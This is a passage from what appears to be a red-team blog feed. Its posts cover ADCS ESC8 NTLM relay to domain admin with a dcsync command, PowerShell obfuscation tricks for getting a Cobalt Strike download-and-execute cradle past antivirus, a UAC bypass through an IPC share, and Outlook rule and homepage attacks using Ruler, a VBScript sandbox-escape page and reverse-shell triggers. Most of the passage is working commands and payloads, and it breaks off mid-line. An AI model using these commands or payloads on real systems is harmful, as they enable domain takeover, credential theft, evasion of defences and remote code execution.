title="ESC8"></a>ESC8</h2><h3 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h3><pre class="line-numbers language-none"><code class="language-none">网上很多了，PetitPotam进行NTLM中继到域管在ADCS下通过管理员可选择安装的附加服务器角色支持多种基于HTTP的注册方法，如证书注册服务通过安装证书注册web服务，通过安装证书注册策略web服务角色&amp;证书注册策略web协同工作，然而此类http证书的注册接口都非常容易遭受NTLM中继使用NTLM中继，可以实现冒用目标用户，从而访问这些web页面，并根据用户和机器证书模板请求客户端身份验证码证书默认情况下，证书注册服务、证书注册策略web服务、网络设备注册服务通过授权http头支持协商身份验证，支持kerberos及NTLM。所以攻击者可以在中继攻击时获得NTLM身份验证虚拟性默认情况下，不会启用https，但是https本身不能抵抗NTLM中继！！！只有当https&amp;通道绑定相结合的时候，才能保护HTTPS服务免遭NTLM中继，ADCS没有为IIS上的身份验证启用扩展保护，并不能启用通道绑定！！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816194325538.png"></p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">这里要用的是impacket下的ntlmrelayx开启监听python3 ntlmrelayx.py -t http://192.168.3.73/certsrv/certfnsh.asp -smb2support --adcs --template <span class="token string">'DomainController'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816195928550.png"></p><pre class="line-numbers language-none"><code class="language-none">PetitPotam强制用户进行身份验证PetitPotam.exe  192.168.3.11  192.168.3.144 [监听ip、目标服务ip]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200115491.png"></p><pre class="line-numbers language-none"><code class="language-none">获得凭证信息如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200142115.png"></p><pre class="line-numbers language-none"><code class="language-none">rubeus进行ptt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200335385.png"></p><pre class="line-numbers language-none"><code class="language-none">凭证已经获取，可以直接冲dcsynclsadump::dcsync &#x2F;domain:rootkit.org  &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816200719283.png"></p><pre class="line-numbers language-none"><code class="language-none">wmic执行命令即可<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ADCS%26ESC1%26ESC8Attack/image-20210816201949460.png"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Domain environment </tag>
            
            <tag> Redteam </tag>
            
            <tag> ADCS </tag>
            
            <tag> ESC1 </tag>
            
            <tag> ESC8 </tag>
            
            <tag> PTT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powershell bypass tips</title>
      <link href="2021/08/11/powershell-bypass-tips/"/>
      <url>2021/08/11/powershell-bypass-tips/</url>
      
        <content type="html"><![CDATA[<h2 id="Command-EXEC"><a href="#Command-EXEC" class="headerlink" title="Command EXEC"></a>Command EXEC</h2><pre class="line-numbers language-none"><code class="language-none">String Add the &amp;&amp;“hostname”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210810164359366.png"></p><pre class="line-numbers language-none"><code class="language-none">IEX()、Invoke-Expression() command execIEX(&quot;whoami&quot;)Invoke-Expression(&quot;whoami&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210810164539173.png"></p><h2 id="Cobaltstrike-Online"><a href="#Cobaltstrike-Online" class="headerlink" title="Cobaltstrike Online"></a>Cobaltstrike Online</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">The default payload like thispowershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"IEX ((new-object net.webclient).downloadstring('http://192.168.159.6:6379/yangsir'))"</span>Must be <span class="token function">kill</span> By AV<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811131954127.png"></p><h3 id="How-to-bypass"><a href="#How-to-bypass" class="headerlink" title="How to bypass"></a>How to bypass</h3><h4 id="The-string-Split"><a href="#The-string-Split" class="headerlink" title="The string Split"></a>The string Split</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>‘new<span class="token operator">-</span>’<span class="token operator">+</span>‘object’ net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>‘downl’<span class="token operator">+</span>‘oadstring’<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="Substitution-variable"><a href="#Substitution-variable" class="headerlink" title="Substitution variable"></a>Substitution variable</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Default payloadpowershell<span class="token punctuation">.</span>exe ”<span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>“replace forward <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>after <span class="token function">IEX</span><span class="token variable">$test</span>=<span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">;</span> <span class="token variable">$test</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span>like this to split the http string<span class="token variable">$a</span>=<span class="token string">'IEX((new-object net.webclient).downloadstring(''ht'</span><span class="token punctuation">;</span><span class="token variable">$b</span>=<span class="token string">'tp://192.168.159.6:6379/yangsir'</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Add-an-escape-character"><a href="#Add-an-escape-character" class="headerlink" title="Add an escape character"></a>Add an escape character</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"IEX ((new-object net.webclient).d`own`load`st`ring('http://192.168.159.6:6379/yangsir'))"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Combined-use"><a href="#Combined-use" class="headerlink" title="Combined use"></a>Combined use</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">Very easy to use<span class="token punctuation">,</span> but like this payload must be <span class="token function">kill</span> againpowershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"<span class="token variable">$t1</span>='IEX(New-Object Net.W';<span class="token variable">$t2</span>='ebClient).Downlo';<span class="token variable">$t3</span>='t4('http://192.168.159.6:6379/yangsir'')'.Replace('t4','adString');IEX(<span class="token variable">$t1</span>+<span class="token variable">$t2</span>+<span class="token variable">$t3</span>)"</span>powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>nop <span class="token operator">-</span>w hidden <span class="token operator">-</span>c <span class="token string">"<span class="token variable">$t1</span>='IEX ((new-object net.webclient).downl';<span class="token variable">$t2</span>='oadstring(''http://192.168.159.6:6379/yangsir''))';<span class="token variable">$t3</span>='<span class="token variable">$t1</span>,<span class="token variable">$t2</span>';IEX(-join <span class="token variable">$t3</span>)"</span>powershell<span class="token punctuation">.</span>exe <span class="token variable">$t1</span>=<span class="token string">'IEX(New-Object Net.W'</span><span class="token punctuation">;</span><span class="token variable">$t2</span>=<span class="token string">'ebClient).Downlo'</span><span class="token punctuation">;</span><span class="token variable">$t3</span>=<span class="token string">'t4('</span>http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>6:6379<span class="token operator">/</span>yangsir<span class="token string">''</span><span class="token punctuation">)</span><span class="token string">'.Replace('</span>t4<span class="token string">','</span>adString<span class="token string">');IEX($t1+$t2+$t3)powershell.exe $t1='</span><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downl<span class="token string">';$t2='</span>oadstring<span class="token punctuation">(</span><span class="token string">''</span>http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>159<span class="token punctuation">.</span>6:6379<span class="token operator">/</span>yangsir<span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token string">';$t3='</span><span class="token variable">$t1</span><span class="token punctuation">,</span><span class="token variable">$t2</span>'<span class="token punctuation">;</span><span class="token function">IEX</span><span class="token punctuation">(</span><span class="token operator">-join</span> <span class="token variable">$t3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Use-alias"><a href="#Use-alias" class="headerlink" title="Use alias"></a>Use alias</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">BypassAVpowershell<span class="token punctuation">.</span>exe <span class="token function">set-alias</span> <span class="token operator">-</span>name test <span class="token operator">-</span>value <span class="token function">Invoke-Expression</span><span class="token punctuation">;</span>test<span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'http://192.168.159.6:6379/yangsir'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811144222680.png"></p><h5 id="Another"><a href="#Another" class="headerlink" title="Another"></a>Another</h5><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token function">set-alias</span> <span class="token operator">-</span>name name1 <span class="token operator">-</span>value <span class="token function">Invoke-Expression</span><span class="token punctuation">;</span><span class="token string">"<span class="token variable">$t1</span>='name1((new-object net.webclient).downl';<span class="token variable">$t2</span>='oannn(''http://192.168.159.6:6379/yangsir''))'.Replace('nnn','dString');<span class="token variable">$t3</span>=<span class="token variable">$t1</span>,<span class="token variable">$t2</span>;<span class="token variable">$tfin</span>=<span class="token variable">$t3</span>;name1(-join <span class="token variable">$tfin</span>)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811151247591.png"></p><h4 id="Copy-PS-exec"><a href="#Copy-PS-exec" class="headerlink" title="Copy PS exec"></a>Copy PS exec</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">copy</span> C:\Windows\System32\WindowsPowerShell\v1<span class="token punctuation">.</span>0\powershell<span class="token punctuation">.</span>exe whoami<span class="token punctuation">.</span>txtwhoami<span class="token punctuation">.</span>txt <span class="token function">set-alias</span> <span class="token operator">-</span>name name1 <span class="token operator">-</span>value <span class="token function">Invoke-Expression</span><span class="token punctuation">;</span><span class="token string">"<span class="token variable">$t1</span>='name1((new-object net.webclient).downl';<span class="token variable">$t2</span>='oannn(''http://192.168.159.6:6379/yangsir''))'.Replace('nnn','dString');<span class="token variable">$t3</span>=<span class="token variable">$t1</span>,<span class="token variable">$t2</span>;<span class="token variable">$tfin</span>=<span class="token variable">$t3</span>;name1(-join <span class="token variable">$tfin</span>)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811151557751.png"></p><h4 id="Too-long-command"><a href="#Too-long-command" class="headerlink" title="Too long command"></a>Too long command</h4><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20tips/image-20210811151807654.png"></p><pre class="line-numbers language-none"><code class="language-none">Also you can use the too long command + copyPS + confusion to Combined use<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> RCE </tag>
            
            <tag> Bypass </tag>
            
            <tag> Powershell </tag>
            
            <tag> Cobaltstrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use IPC BypassUAC</title>
      <link href="2021/08/08/use-ipc-bypassuac/"/>
      <url>2021/08/08/use-ipc-bypassuac/</url>
      
        <content type="html"><![CDATA[<h6 id="After-the-actual-test-some-environments-can-be-successful"><a href="#After-the-actual-test-some-environments-can-be-successful" class="headerlink" title="After the actual test, some environments can be successful"></a>After the actual test, some environments can be successful</h6><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">In many scenarios<span class="token punctuation">,</span> you <span class="token keyword">do</span> not have <span class="token function">write</span> permission to the system directory<span class="token punctuation">.</span> Here you will use this method to obtain <span class="token function">write</span> permission to the fileC:\Windows\System32>net use A: \\127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1\c$命令成功完成。C:\Windows\System32>A:A:\>cd Windows\System32A:\Windows\System32><span class="token function">echo</span> test >test111A:\Windows\System32><span class="token function">dir</span> test111 驱动器 A 中的卷没有标签。 卷的序列号是 4C43<span class="token operator">-</span>ED5B A:\Windows\System32 的目录2021<span class="token operator">/</span>08<span class="token operator">/</span>08  15:01                 7 test111               1 个文件              7 字节               0 个目录 31<span class="token punctuation">,</span>098<span class="token punctuation">,</span>544<span class="token punctuation">,</span>128 可用字节A:\Windows\System32><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Use%20IPC%20BypassUAC/image-20210808150507232.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> UAC </tag>
            
            <tag> IPC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Attack the Outlook client</title>
      <link href="2021/08/04/attack-the-outlook-client/"/>
      <url>2021/08/04/attack-the-outlook-client/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Outlook is a special software for email management in Office software. Exchange users can use Outlook to manage emails. It is also one of the most widely used Office software. Outlook is very powerful, some of the legitimate functions due to its particularity, when some of the attacker&#39;s tactics can often achieve unexpected results<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Rules-and-Notices"><a href="#Rules-and-Notices" class="headerlink" title="Rules and Notices"></a>Rules and Notices</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">The rules and notification functions can be used to set policies for email receiving and sending, including rule conditions and actions. When certain conditions are met, a specified action is triggered, such as managing emails or even starting programs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803152344733.png"></p><pre class="line-numbers language-none"><code class="language-none">When you get a password for an email account, you can use that password to add rules that allow the target to execute special commands, such as bounce shell, when it receives a particular messageNote that the user needs to open outlook to activate the command. It cannot be triggered without outlook. However, if the owa is opened and the outlook is opened, the command can also be triggered<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">The new rule is as follows<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803152917869.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803152935119.png"></p><pre class="line-numbers language-none"><code class="language-none">you can make your exe in the smb share such as <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803153011742.png"></p><pre class="line-numbers language-none"><code class="language-none">Confirm receiving emails with related topics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803153129873.png"></p><pre class="line-numbers language-none"><code class="language-none">read the email target will online like this <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803153315676.png"></p><h2 id="The-home-page"><a href="#The-home-page" class="headerlink" title="The home page"></a>The home page</h2><h3 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h3><pre class="line-numbers language-none"><code class="language-none">The Outlooke client provides a feature that allows users to set the home page of the inbox interface while using Outlook, loading external urls through the inbox properties and rendering the inbox page<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210803163542055.png"></p><pre class="line-numbers language-none"><code class="language-none">As the setting property of the inbox, the inbox homepage URL is synchronized between the Outlook client and the Exchange server. You can directly set this property when interacting with the Exchange server through the MAPI&#x2F;HTTP protocol. Therefore, on the premise that you have legitimate mailbox credentials, you can use this function to set the URL attribute of inbox home page for the mailbox user and point it to the page containing malicious code. When the user browse and refresh the inbox in Outlook, the malicious page will be loaded and the malicious script code will be executed to form the remote command execution<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html">With the aggressive window_onLoad function, an object of type wscript. Shell is created when the page loads, and then the command program is executedNote:The URL to which the home page of the Outlook inbox points is loaded in Outlook via the Iframe tag, and its execution of WScript or VBScript is limited by the sandbox environment, which prevents the script code from being used to create sensitive malicious objects. That is, the CreateObject(" wscript. Shell ") command cannot be executed directly. Here, however, you can escape the Outlook sandbox by loading the ActiveX component associated with the Outlook view, and then getting the ViewCtl1 object from which you can get the application object OutlookApplication, which represents the entire Outlook application. You can then call the CreateObject method directly from the Outlook application object to create a new application object, wscript. Shell, and execute any command<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Language<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en-us<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=windows-1252<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Outlook<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>clientEventHandlersVBS</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>vbscript</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>  Sub <span class="token function">window_onload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>     Set Application <span class="token operator">=</span> ViewCtl1<span class="token punctuation">.</span>OutlookApplication     Set cmd <span class="token operator">=</span> Application<span class="token punctuation">.</span><span class="token function">CreateObject</span><span class="token punctuation">(</span><span class="token string">"Wscript.Shell"</span><span class="token punctuation">)</span>     cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span> End Sub<span class="token operator">--</span><span class="token operator">></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">classid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clsid:0006F063-0000-0000-C000-000000000046<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ViewCtl1<span class="token punctuation">"</span></span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100%<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Use-Tools"><a href="#Use-Tools" class="headerlink" title="Use Tools"></a>Use Tools</h2><h3 id="From【KB4011091-FIX】"><a href="#From【KB4011091-FIX】" class="headerlink" title="From【KB4011091 FIX】"></a>From【KB4011091 FIX】</h3><pre class="line-numbers language-none"><code class="language-none">get .&#x2F;ruler-osx64 --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug form displayadd.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug form add --suffix test --input C:\test\t.txt --rule --sendtxt:your command exec codeatt.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug  form  send --target icle@rootkit.org --suffix test --subject &quot;test&quot; --body &quot;test&quot;del.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug  form  delete --suffix test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Ruler"><a href="#Ruler" class="headerlink" title="Ruler"></a>Ruler</h3><pre class="line-numbers language-none"><code class="language-none">get.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug displayadd.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug  —-location &quot;\\\\192.168.3.145\\webdav\\shell.bat&quot; —-trigger test —-name testatt.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug send --subject &quot;test&quot;  --body &quot;test&quot;del.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 -—verbose —-debug delete —id XXXX<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Homepage【CVE-2017-11774修复】"><a href="#Homepage【CVE-2017-11774修复】" class="headerlink" title="Homepage【CVE-2017-11774修复】"></a>Homepage【CVE-2017-11774修复】</h3><pre class="line-numbers language-none"><code class="language-none">the same easy ways.&#x2F;ruler-osx64 --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 --verbose --debug homepage display.&#x2F;ruler-osx64 --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 —-verbose -—debug homepage add —-url https:&#x2F;&#x2F;192.168.3.144&#x2F;aspnet_client&#x2F;1.html.&#x2F;ruler-osx64  --insecure --url https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml   --email micle@rootkit.org -u micle -p Admin12345 -—verbose —-debug homepage delete<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Special-Notes"><a href="#Special-Notes" class="headerlink" title="Special Notes"></a>Special Notes</h3><pre class="line-numbers language-none"><code class="language-none">In some environments, RPC authentication may be successful, but attacks still cannot be attackedIt is not solved at present, and I don&#39;t know the reason for it. If any master knows, please inform me, thank youLike this:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Attack%20the%20Outlook%20client/image-20210804204540031.png"></p><pre class="line-numbers language-none"><code class="language-none">In my fail&#39;s environment, the ruler meet some problem like this:There is still an error in all English directories, release and personal compilation are not available[*] Autodiscover step 0 - URL: https:&#x2F;&#x2F;192.168.3.144&#x2F;autodiscover&#x2F;autodiscover.xml[*] EXPR provider was selected[*] Authentication scheme 